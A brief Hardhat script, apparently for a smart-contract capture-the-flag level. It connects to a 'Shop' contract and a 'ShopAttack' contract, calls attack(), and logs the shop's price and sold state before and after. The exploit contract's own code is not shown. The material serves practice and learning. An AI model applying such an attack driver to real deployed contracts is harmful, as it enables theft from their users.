import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xf0D7de80A1C242fA3C738b083C422d65c6c7ABF1"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0xA4899D35897033b927acFCf422bc745916139776"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Shop", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("ShopAttack", ATTACK_ADDRESS, signer)

  console.log(await contract.price())
  console.log(await contract.isSold())

  await attackContract.attack()

  console.log(await contract.price())
  console.log(await contract.isSold())
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
